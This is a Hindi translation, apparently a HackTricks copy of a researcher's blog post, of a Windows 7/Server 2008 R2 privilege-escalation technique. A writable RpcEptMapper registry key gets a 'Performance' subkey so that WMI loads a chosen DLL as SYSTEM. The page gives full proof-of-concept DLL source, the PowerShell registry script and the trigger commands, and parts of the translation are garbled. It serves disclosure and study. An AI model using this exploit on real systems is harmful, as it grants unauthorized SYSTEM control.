<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS की नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की आवश्यकता है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!

- खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)

- प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में या मुझे **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)** का** **अनुसरण** करें।**

- **अपने हैकिंग ट्रिक्स को [hacktricks रेपो](https://github.com/carlospolop/hacktricks) और [hacktricks-cloud रेपो](https://github.com/carlospolop/hacktricks-cloud) में पीआर जमा करके साझा करें।**

</details>


**जानकारी** [**https://itm4n.github.io/windows-registry-rpceptmapper-eop/**](https://itm4n.github.io/windows-registry-rpceptmapper-eop/) **से कॉपी की गई है**

स्क्रिप्ट के आउटपुट के अनुसार, मौजूदा उपयोगकर्ता को दो रजिस्ट्री कुंजियों पर कुछ लेखन अनुमतियाँ हैं:

* `HKLM\SYSTEM\CurrentControlSet\Services\Dnscache`
* `HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper`

हम `regedit` GUI का उपयोग करके `RpcEptMapper` सेवा की अनुमतियों की जांच करेंगे। मुझे _Advanced Security Settings_ विंडो में एक बात बहुत पसंद है, वह है _Effective Permissions_ टैब। आप किसी भी उपयोगकर्ता या समूह का चयन कर सकते हैं और इस प्रमुखला को देख सकते हैं जिसे इस प्रमुखला को अलग-अलग ACEs की जांच करने की आवश्यकता नहीं होती है। निम्नलिखित स्क्रीनशॉट में निम्नलिखित नतीजा दिखाया गया है निम्नलिखित निम्नलिखित `lab-user` खाते के लिए।

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/02\_regsitry-rpceptmapper-permissions.png)

अधिकांश अनुमतियाँ मानक हैं (उदा।: `Query Value`) लेकिन एक विशेषता बहुत ध्यान दिलाती है: `Create Subkey`। इस अनुमति के लिए सामान्य नाम `AppendData/AddSubdirectory` है, जो बिल्कुल वही है जो स्क्रिप्ट द्वारा रिपोर्ट किया गया था:
```
Name              : RpcEptMapper
ImagePath         : C:\Windows\system32\svchost.exe -k RPCSS
User              : NT AUTHORITY\NetworkService
ModifiablePath    : {Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RpcEptMapper}
IdentityReference : NT AUTHORITY\Authenticated Users
Permissions       : {ReadControl, AppendData/AddSubdirectory, ReadData/ListDirectory}
Status            : Running
UserCanStart      : True
UserCanRestart    : False

Name              : RpcEptMapper
ImagePath         : C:\Windows\system32\svchost.exe -k RPCSS
User              : NT AUTHORITY\NetworkService
ModifiablePath    : {Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RpcEptMapper}
IdentityReference : BUILTIN\Users
Permissions       : {WriteExtendedAttributes, AppendData/AddSubdirectory, ReadData/ListDirectory}
Status            : Running
UserCanStart      : True
UserCanRestart    : False
```
यह बिलकुल स्पष्ट करता है कि हम केवल `ImagePath` मान को संशोधित नहीं कर सकते। इसे करने के लिए, हमें `WriteData/AddFile` अनुमति की आवश्यकता होगी। इसके बजाय, हम केवल एक नया सबकी बना सकते हैं।

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/03_registry-imagepath-access-denied.png)

क्या यह यकीनन एक गलती थी? निश्चित रूप से नहीं। मज़े शुरू हो जाएं!

## RTFM <a href="#rtfm" id="rtfm"></a>

इस बिंदु पर, हम जानते हैं कि हम `HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper` के तहत एकाधिक उप-सबकी बना सकते हैं लेकिन हम मौजूदा उप-सबकी और मानों को संशोधित नहीं कर सकते हैं। ये पहले से मौजूद उप-सबकी `Parameters` और `Security` हैं, जो विंडोज सेवाओं के लिए काफी सामान्य हैं।

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/04_registry-rpceptmapper-config.png)

इसलिए, पहला सवाल जो मन में उठा था वह यह था: _क्या कोई अन्य पूर्वनिर्धारित उप-सबकी - जैसे `Parameters` और `Security` - है जिसे हम सेवा के व्यवस्थापन को प्रभावी ढंग से संशोधित करने और इसके व्यवहार में परिवर्तन करने के लिए उपयोग कर सकते हैं?_

इस सवाल का उत्तर देने के लिए, मेरी प्राथमिक योजना थी कि मैं सभी मौजूदा कुंजीयों की गणना करें और एक पैटर्न पहचानने की कोशिश करें। विचार यह था कि किस सबकी सेवा के व्यवस्थापन के लिए _मायने रखने वाली_ हो सकती हैं। मैंने सोचना शुरू किया कि मैं इसे पावरशेल में कैसे लागू कर सकता हूँ और फिर परिणाम को क्रमबद्ध कर सकता हूँ। हालांकि, इसे करने से पहले, मैंने सोचा कि क्या यह रजिस्ट्री संरचना पहले से ही दस्तावेज़ीकृत है। तो, मैंने `windows service configuration registry site:microsoft.com` जैसा कुछ गूगल किया और यहां यहां पहला [परिणाम](https://docs.microsoft.com/en-us/windows-hardware/drivers/install/hklm-system-currentcontrolset-services-registry-tree) आया।

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/05_google-search-registry-services.png)

वादा करने वाला लगता है, क्या नहीं? पहली नज़र में, दस्तावेज़ीकरण पूर्ण और संपूर्ण नहीं लग रहा था। शीर्षक को ध्यान में रखते हुए, मुझे एक प्रकार की पेड़ संरचना दिखाई देने की उम्मीद थी जो सेवा के व्यवस्थापन को परिभाषित करने वाली सभी उप-सबकीयों और मानों का विवरण देती है, लेकिन यह वहां स्पष्ट रूप से नहीं था।

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/06_doc-registry-services.png)

फिर भी, मैंने प्रत्येक अनुच्छेद पर तेजी से नज़र डाली। और, मैंने जल्दी से "व्यापार" और "DLL" शब्दों को देखा। "प्रदर्शन" उपशीर्षक के तहत, हम निम्नलिखित पढ़ सकते हैं:

> **प्रदर्शन**: _एक कुंजी जो वैकल्पिक प्रदर्शन मॉनिटरिंग के लिए जानकारी निर्दिष्ट करती है। इस कुंजी के तहत मौजूद मान निर्दिष्ट करते हैं **ड्राइवर के प्रदर्शन DLL का नाम** और **उस DLL में कुछ निर्यातित फ़ंक्शनों के नाम**। आप इस सबकी के लिए वैल्यू एंट्रीज़ को ड्राइवर के INF फ़ाइल में AddReg एंट्रीज़ का उपयोग करके जोड़ सकते हैं।_

इस छोटे पैराग्राफ के अनुसार, ऐसा संभव है कि किसी ड्राइवर सेवा में अपने प्रदर्शन की निगरानी करने के लिए एक DLL को पंजीकृत किया जा सकता है धन्यवाद `Performance` उप-सबकी के। **ठीक है, यह वास्तव में दिलचस्प है!** यह कुंजी `RpcEptMapper` सेवा के लिए डिफ़ॉल्ट रूप से मौजूद नहीं है, इसलिए ऐसा लगता है कि यह _बिल्कुल_ वही है जो हमें चाहिए। हालांकि, इसमें थोड़ी सी समस्या है, यह सेवा निश्चित रूप से एक ड्राइवर सेवा नहीं है। फिर भी, इसे आज़माने में वापसी करने का मूल्य है, लेकिन हमें इस "प्रदर्शन मॉनिटरिंग" विशेषता के बारे में अधिक जानकारी चाहिए।

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/07_sc-qc-rpceptmapper.png)

> **नोट:** विंडोज में, प्रत्येक सेवा के एक निर्दिष्ट `प्रकार` होता है। सेवा प्रकार निम्नलिखित मानों में से एक हो सकता है: `SERVICE_KERNEL_DRIVER (1)`, `SERVICE_FILE_SYSTEM_DRIVER (2)`, `SERVICE_ADAPTER (4)`, `SERVICE_RECOGNIZER_DRIVER (8)`, `SERVICE_WIN32_OWN_PROCESS (16)`, `SERVICE_WIN32_SHARE_PROCESS (32)`
```
DWORD APIENTRY OpenPerfData(LPWSTR pContext);
DWORD APIENTRY CollectPerfData(LPWSTR pQuery, PVOID* ppData, LPDWORD pcbData, LPDWORD pObjectsReturned);
DWORD APIENTRY ClosePerfData();
```
मुझे लगता है कि सिद्धांत के साथ इतना ही काफी है, अब कोड लिखने का समय है!

## एक प्रमाण-ऑफ-कार्य लिखना <a href="#writing-a-proof-of-concept" id="writing-a-proof-of-concept"></a>

दस्तावेज़ीकरण के माध्यम से मैंने इकट्ठा की गई सभी बिट्स और टुकड़ों के धन्यवाद, एक सरल प्रमाण-ऑफ-कार्य DLL लिखना बहुत सरल होना चाहिए। लेकिन फिर भी, हमें एक योजना की आवश्यकता है!

जब मुझे किसी भी प्रकार की DLL हाइजैकिंग संरचना का शोध करने की आवश्यकता होती है, तो मैं आमतौर पर एक सरल और कस्टम लॉग सहायक फ़ंक्शन के साथ शुरू करता हूँ। इस फ़ंक्शन का उद्देश्य होता है कि जब भी यह आह्वान किया जाता है, तो कुछ महत्वपूर्ण जानकारी एक फ़ाइल में लिखें। आमतौर पर, मैं वर्तमान प्रक्रिया और माता प्रक्रिया का पीआईडी, प्रक्रिया को चलाने वाले उपयोगकर्ता का नाम और संबंधित कमांड लाइन लॉग करता हूँ। मैं इसके अलावा भी लॉग करता हूँ कि इस लॉग घटना को ट्रिगर करने वाले फ़ंक्शन का नाम। इस तरह, मुझे पता चलता है कि कोड का कौन सा हिस्सा निष्पादित हुआ था।

मेरे अन्य लेखों में, मैंने हमेशा विकास भाग को छोड़ दिया क्योंकि मुझे लगा कि यह अधिकांश अभिज्ञ है। लेकिन, मैं अपने ब्लॉग पोस्ट को शुरुआती स्तर के उपयोगकर्ता के लिए भी सुलभ बनाना चाहता हूँ, इसलिए यहाँ इस प्रक्रिया का विवरण देता हूँ। तो, चलो विज़ुअल स्टूडियो को चालू करें और एक नया "_सी++ कंसोल ऐप_" परियोजना बनाएं। ध्यान दें कि मैंने एक "_डायनामिक-लिंक लाइब्रेरी (DLL)_" परियोजना बना सकता था, लेकिन मुझे वास्तव में एक कंसोल ऐप से शुरू करना आसान लगता है।

यहाँ विज़ुअल स्टूडियो द्वारा उत्पन्न कोड है:
```c
#include <iostream>

int main()
{
std::cout << "Hello World!\n";
}
```
बेशक, यह हमारी इच्छा नहीं है। हम DLL बनाना चाहते हैं, EXE नहीं, इसलिए हमें `main` फ़ंक्शन को `DllMain` के साथ बदलना होगा। आप इस फ़ंक्शन के लिए एक स्केलेटन कोड दस्तावेज़ीकरण में पा सकते हैं: [DLL को प्रारंभ करें](https://docs.microsoft.com/en-us/cpp/build/run-time-library-behavior#initialize-a-dll)।
```c
#include <Windows.h>

extern "C" BOOL WINAPI DllMain(HINSTANCE const instance, DWORD const reason, LPVOID const reserved)
{
switch (reason)
{
case DLL_PROCESS_ATTACH:
Log(L"DllMain"); // See log helper function below
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
case DLL_PROCESS_DETACH:
break;
}
return TRUE;
}
```
साथ ही, हमें प्रोजेक्ट की सेटिंग्स भी बदलनी होगी ताकि आउटपुट कंपाइल फ़ाइल EXE की जगह DLL हो। इसके लिए, आप प्रोजेक्ट प्रॉपर्टीज़ खोल सकते हैं और "General" खंड में, "Configuration Type" के रूप में "Dynamic Library (.dll)" को चुन सकते हैं। शीर्षक पट्टी के नीचे, आप "All Configurations" और "All Platforms" भी चुन सकते हैं ताकि यह सेटिंग सभी विकल्पों पर लागू हो सके।

अगले, मैं अपने कस्टम लॉग सहायक फ़ंक्शन जोड़ता हूँ।
```c
#include <Lmcons.h> // UNLEN + GetUserName
#include <tlhelp32.h> // CreateToolhelp32Snapshot()
#include <strsafe.h>

void Log(LPCWSTR pwszCallingFrom)
{
LPWSTR pwszBuffer, pwszCommandLine;
WCHAR wszUsername[UNLEN + 1] = { 0 };
SYSTEMTIME st = { 0 };
HANDLE hToolhelpSnapshot;
PROCESSENTRY32 stProcessEntry = { 0 };
DWORD dwPcbBuffer = UNLEN, dwBytesWritten = 0, dwProcessId = 0, dwParentProcessId = 0, dwBufSize = 0;
BOOL bResult = FALSE;

// Get the command line of the current process
pwszCommandLine = GetCommandLine();

// Get the name of the process owner
GetUserName(wszUsername, &dwPcbBuffer);

// Get the PID of the current process
dwProcessId = GetCurrentProcessId();

// Get the PID of the parent process
hToolhelpSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
stProcessEntry.dwSize = sizeof(PROCESSENTRY32);
if (Process32First(hToolhelpSnapshot, &stProcessEntry)) {
do {
if (stProcessEntry.th32ProcessID == dwProcessId) {
dwParentProcessId = stProcessEntry.th32ParentProcessID;
break;
}
} while (Process32Next(hToolhelpSnapshot, &stProcessEntry));
}
CloseHandle(hToolhelpSnapshot);

// Get the current date and time
GetLocalTime(&st);

// Prepare the output string and log the result
dwBufSize = 4096 * sizeof(WCHAR);
pwszBuffer = (LPWSTR)malloc(dwBufSize);
if (pwszBuffer)
{
StringCchPrintf(pwszBuffer, dwBufSize, L"[%.2u:%.2u:%.2u] - PID=%d - PPID=%d - USER='%s' - CMD='%s' - METHOD='%s'\r\n",
st.wHour,
st.wMinute,
st.wSecond,
dwProcessId,
dwParentProcessId,
wszUsername,
pwszCommandLine,
pwszCallingFrom
);

LogToFile(L"C:\\LOGS\\RpcEptMapperPoc.log", pwszBuffer);

free(pwszBuffer);
}
}
```
तब हम DLL को तीन फ़ंक्शनों से भर सकते हैं जिन्हें हमने दस्तावेज़ीकरण में देखा था। दस्तावेज़ीकरण यह भी बताता है कि यदि सफल हो तो वे `ERROR_SUCCESS` लौटाना चाहिए।
```c
DWORD APIENTRY OpenPerfData(LPWSTR pContext)
{
Log(L"OpenPerfData");
return ERROR_SUCCESS;
}

DWORD APIENTRY CollectPerfData(LPWSTR pQuery, PVOID* ppData, LPDWORD pcbData, LPDWORD pObjectsReturned)
{
Log(L"CollectPerfData");
return ERROR_SUCCESS;
}

DWORD APIENTRY ClosePerfData()
{
Log(L"ClosePerfData");
return ERROR_SUCCESS;
}
```
ठीक है, तो परियोजना अब सही ढंग से कॉन्फ़िगर हो गई है, `DllMain` को लागू किया गया है, हमारे पास एक लॉग सहायक फ़ंक्शन और तीन आवश्यक फ़ंक्शन हैं। लेकिन एक चीज़ अभी भी बाकी है। यदि हम इस कोड को कंपाइल करते हैं, `OpenPerfData`, `CollectPerfData` और `ClosePerfData` केवल आंतरिक फ़ंक्शन के रूप में ही उपलब्ध होंगे, इसलिए हमें उन्हें **निर्यात** करने की आवश्यकता है। इसे कई तरीकों से प्राप्त किया जा सकता है। उदाहरण के लिए, आप एक [DEF](https://docs.microsoft.com/en-us/cpp/build/exporting-from-a-dll-using-def-files) फ़ाइल बना सकते हैं और फिर परियोजना को उचित ढंग से कॉन्फ़िगर कर सकते हैं। हालांकि, मुझे इस छोटे परियोजना के लिए विशेष रूप से `__declspec(dllexport)` कीवर्ड ([दस्तावेज़ीकरण](https://docs.microsoft.com/en-us/cpp/build/exporting-from-a-dll-using-declspec-dllexport)) का उपयोग करना अच्छा लगता है। इस तरीके से, हमें बस स्रोत कोड की शुरुआत में तीन फ़ंक्शन घोषित करने की आवश्यकता होती है।
```c
extern "C" __declspec(dllexport) DWORD APIENTRY OpenPerfData(LPWSTR pContext);
extern "C" __declspec(dllexport) DWORD APIENTRY CollectPerfData(LPWSTR pQuery, PVOID* ppData, LPDWORD pcbData, LPDWORD pObjectsReturned);
extern "C" __declspec(dllexport) DWORD APIENTRY ClosePerfData();
```
यदि आप पूरा कोड देखना चाहते हैं, तो मैंने इसे [यहाँ](https://gist.github.com/itm4n/253c5937f9b3408b390d51ac068a4d12) अपलोड किया है।

अंत में, हम _**Release/x64**_ और "_**Build the solution**_" का चयन कर सकते हैं। इससे हमारी DLL फ़ाइल उत्पन्न होगी: `.\DllRpcEndpointMapperPoc\x64\Release\DllRpcEndpointMapperPoc.dll`।

## पोसी का परीक्षण <a href="#testing-the-poc" id="testing-the-poc"></a>

आगे बढ़ने से पहले, मैं हमेशा सुनिश्चित करता हूँ कि मेरे पेलोड सही ढंग से काम कर रहा है इसके द्वारा इसे अलग से परीक्षण करके। एक छोटा समय यहां बिताने से आपको एक कल्पनाशील डीबग चरण के दौरान खुद को खोखला जाने से बचाने के लिए बहुत समय बचा सकता है। इसके लिए, हम आसानी से `rundll32.exe` का उपयोग कर सकते हैं और DLL का नाम और निर्यातित किए गए फ़ंक्शन का नाम पैरामीटर के रूप में पास कर सकते हैं।
```
C:\Users\lab-user\Downloads\>rundll32 DllRpcEndpointMapperPoc.dll,OpenPerfData
```
![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/09\_test-poc-rundll32.gif)

बहुत अच्छा, लॉग फ़ाइल बनाई गई है और अगर हम इसे खोलें तो हमें दो प्रविष्टियाँ दिखाई देंगी। पहली प्रविष्टि तब लिखी गई थी जब `rundll32.exe` द्वारा DLL लोड की गई थी। दूसरी प्रविष्टि तब लिखी गई थी जब `OpenPerfData` को कॉल किया गया था। अच्छा लग रहा है! ![:slightly\_smiling\_face:](https://github.githubassets.com/images/icons/emoji/unicode/1f642.png)
```
[21:25:34] - PID=3040 - PPID=2964 - USER='lab-user' - CMD='rundll32  DllRpcEndpointMapperPoc.dll,OpenPerfData' - METHOD='DllMain'
[21:25:34] - PID=3040 - PPID=2964 - USER='lab-user' - CMD='rundll32  DllRpcEndpointMapperPoc.dll,OpenPerfData' - METHOD='OpenPerfData'
```
ठीक है, अब हम वास्तविक संकट पर ध्यान केंद्रित कर सकते हैं और आवश्यक रजिस्ट्री कुंजी और मान बनाने की शुरुआत कर सकते हैं। हम इसे या तो मैन्युअल रूप से `reg.exe` / `regedit.exe` का उपयोग करके कर सकते हैं या स्क्रिप्ट के साथ कार्यान्वयनिक रूप से कर सकते हैं। क्योंकि मैं पहले से ही अपने प्राथमिक अनुसंधान के दौरान मैन्युअल चरणों से गुजर चुका हूँ, मैं एक स्वच्छ तरीका दिखाऊंगा जिससे हम एक ही चीज को पावरशेल स्क्रिप्ट के साथ कर सकते हैं। इसके अलावा, पावरशेल में रजिस्ट्री कुंजी और मान बनाना `New-Item` और `New-ItemProperty` को बुलाने के समान है, क्या नहीं? ![:thinking:](https://github.githubassets.com/images/icons/emoji/unicode/1f914.png)

![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/10\_powershell-new-item-access-denied.png)

`Requested registry access is not allowed`... हम्म्म, ठीक है... ऐसा लगता है कि यह इतना आसान नहीं होगा। ![:stuck\_out\_tongue:](https://github.githubassets.com/images/icons/emoji/unicode/1f61b.png)

मैंने वास्तव में इस मुद्दे की जांच नहीं की है लेकिन मेरा अनुमान है कि जब हम `New-Item` को बुलाते हैं, तो `powershell.exe` वास्तव में हमारे पास नहीं होने वाली अनुमतियों को संबोधित करने वाले कुछ ध्वज लेकर माता-पिता रजिस्ट्री कुंजी को खोलने का प्रयास करता है।

फिर भी, यदि इन निर्मित cmdlets का काम नहीं करता है, तो हम हमेशा एक स्तर नीचे जा सकते हैं और सीधे DotNet फ़ंक्शन को आह्वान कर सकते हैं। वास्तव में, रजिस्ट्री कुंजी निम्नलिखित कोड के साथ पावरशेल में बनाई जा सकती है।
```
[Microsoft.Win32.Registry]::LocalMachine.CreateSubKey("SYSTEM\CurrentControlSet\Services\RpcEptMapper\Performance")
```
![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/11\_powershell-dotnet-createsubkey.png)

चलो शुरू करते हैं! अंत में, मैंने उचित कुंजी और मानों को बनाने के लिए निम्नलिखित स्क्रिप्ट तैयार किया है, कुछ उपयोगकर्ता इनपुट के लिए प्रतीक्षा करें और अंत में सब कुछ साफ करके समाप्त करें।
```
$ServiceKey = "SYSTEM\CurrentControlSet\Services\RpcEptMapper\Performance"

Write-Host "[*] Create 'Performance' subkey"
[void] [Microsoft.Win32.Registry]::LocalMachine.CreateSubKey($ServiceKey)
Write-Host "[*] Create 'Library' value"
New-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Library" -Value "$($pwd)\DllRpcEndpointMapperPoc.dll" -PropertyType "String" -Force | Out-Null
Write-Host "[*] Create 'Open' value"
New-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Open" -Value "OpenPerfData" -PropertyType "String" -Force | Out-Null
Write-Host "[*] Create 'Collect' value"
New-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Collect" -Value "CollectPerfData" -PropertyType "String" -Force | Out-Null
Write-Host "[*] Create 'Close' value"
New-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Close" -Value "ClosePerfData" -PropertyType "String" -Force | Out-Null

Read-Host -Prompt "Press any key to continue"

Write-Host "[*] Cleanup"
Remove-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Library" -Force
Remove-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Open" -Force
Remove-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Collect" -Force
Remove-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Close" -Force
[Microsoft.Win32.Registry]::LocalMachine.DeleteSubKey($ServiceKey)
```
अब आखिरी कदम, **हम RPC Endpoint Mapper सेवा को कैसे धोखा देंगे ताकि हमारा Performace DLL लोड हो जाए?** दुःख की बात है, मैंने सभी विभिन्न चीजों का ट्रैक नहीं रखा है जो मैंने प्रयास किए। यह ब्लॉग पोस्ट के संदर्भ में यह दिखाना बहुत रोचक होता कि अनुसंधान कितना थकाऊ और समय लेने वाला हो सकता है। फिर भी, मैंने रास्ते में एक चीज़ खोजी है कि आप WMI (Windows Management Instrumentation) का उपयोग करके _Perfomance Counters_ को क्वेरी कर सकते हैं, जो बहुत ही आश्चर्यजनक नहीं है। अधिक जानकारी यहां मिलेगी: [_WMI Performance Counter Types_](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-performance-counter-types).

> _काउंटर प्रकार Win32_PerfRawData कक्षाओं में गुणांक प्रकार के रूप में प्रकट होते हैं, और Win32_PerfFormattedData कक्षाओं में गुणांक प्रकार के रूप में CookingType गुणांक प्रकार के रूप में प्रकट होते हैं।_

तो, मैंने पहले PowerShell में निम्नलिखित कमांड का उपयोग करके _Performace Data_ से संबंधित WMI कक्षाओं की जांच की।
```
Get-WmiObject -List | Where-Object { $_.Name -Like "Win32_Perf*" }
```
![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/12\_powershell-get-wmiobject.gif)

और, मैंने देखा कि मेरी लॉग फ़ाइल तुरंत बनाई गई थी! यहां फ़ाइल की सामग्री है।
```
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='DllMain'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='OpenPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
[21:17:49] - PID=4904 - PPID=664 - USER='SYSTEM' - CMD='C:\Windows\system32\wbem\wmiprvse.exe' - METHOD='CollectPerfData'
```
मैंने अपेक्षित किया था कि मैं `RpcEptMapper` सेवा के संदर्भ में `NETWORK SERVICE` के रूप में एकांत्रित कोड निष्पादन प्राप्त करूंगा, लेकिन यह ऐसा दिखता है कि मैंने अपेक्षित से बहुत बेहतर परिणाम प्राप्त किए हैं। मैंने वास्तव में `WMI` सेवा के संदर्भ में एकांत्रित कोड निष्पादन प्राप्त किया है, जो `LOCAL SYSTEM` के रूप में चलती है। यह कितना अद्भुत है! ![:sunglasses:](https://github.githubassets.com/images/icons/emoji/unicode/1f60e.png)

> **नोट:** यदि मैं `NETWORK SERVICE` के रूप में एकांत्रित कोड निष्पादन प्राप्त करता, तो मैं `LOCAL SYSTEM` खाते के बस एक टोकन दूर होता, जो जेम्स फोरशॉ द्वारा कुछ महीने पहले इस ब्लॉग पोस्ट में दिखाया गया था: [Sharing a Logon Session a Little Too Much](https://www.tiraniddo.dev/2020/04/sharing-logon-session-little-too-much.html).

मैंने प्रत्येक WMI कक्षा को अलग-अलग प्रयास किया और मैंने यही समान परिणाम देखा है।
```
Get-WmiObject Win32_Perf
Get-WmiObject Win32_PerfRawData
Get-WmiObject Win32_PerfFormattedData
```
## निष्कर्ष <a href="#निष्कर्ष" id="निष्कर्ष"></a>

मुझे यह विकर्षण की कमजोरी इतनी देर तक नजर नहीं आई है। एक व्याख्या यह है कि अन्य उपकरणों ने संग्रह में पूर्ण लेखन पहुंच की तलाश की होगी, जबकि इस मामले में `AppendData/AddSubdirectory` पर्याप्त था। "गलत रूप से समाकृति" के संबंध में, मैं मान लेता हूं कि रजिस्ट्री कुंजी को इस तरह सेट किया गया था कि एक विशेष उद्देश्य के लिए, हालांकि मुझे कोई ऐसा स्थिति नहीं आता है जिसमें उपयोगकर्ताओं को किसी सेवा के विन्यास को संशोधित करने के लिए किसी भी प्रकार की अनुमति हो सकती है।

मैंने इस विकर्षण के बारे में दो कारणों से सार्वजनिक रूप से लिखने का निर्णय लिया है। पहला यह है कि मैंने वास्तव में इसे सार्वजनिक बनाया - शुरू में इसे समझने के बिना - जिस दिन मैंने अपने PrivescCheck स्क्रिप्ट को `GetModfiableRegistryPath` फ़ंक्शन के साथ अपडेट किया था, जो कई महीने पहले था। दूसरा कारण यह है कि प्रभाव कम है। इसके लिए स्थानीय पहुंच की आवश्यकता होती है और यह केवल पुराने संस्करणों को प्रभावित करता है जो अब समर्थित नहीं हैं (यदि आपने Extended Support खरीदा है तो ...). इस समय, यदि आप अभी भी Windows 7 / Server 2008 R2 का उपयोग कर रहे हैं और इन मशीनों को सही ढंग से नेटवर्क में अलग करने के बाद, तो एक हमलावर को SYSTEM विशेषाधिकार प्राप्त करने से रोकना शायद आपकी चिंताओं में सबसे कम होगा।

इस विशेषाधिकार विकर्षण की किस्से की अलावा, मुझे लगता है कि यह "प्रदर्शन" रजिस्ट्री सेटिंग पोस्ट उत्पादन, अन्तर्गत चलन और AV/EDR टालने के लिए वास्तव में दिलचस्प अवसर खोलता है। मेरे पास पहले से ही कुछ विशेष परिदृश्यों का ख्याल है लेकिन मैंने उनमें से किसी का भी परीक्षण नहीं किया है। जारी रखने के लिए?...

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks** में विज्ञापित करना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने** की अनुमति चाहिए? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!

- खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)

- प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)

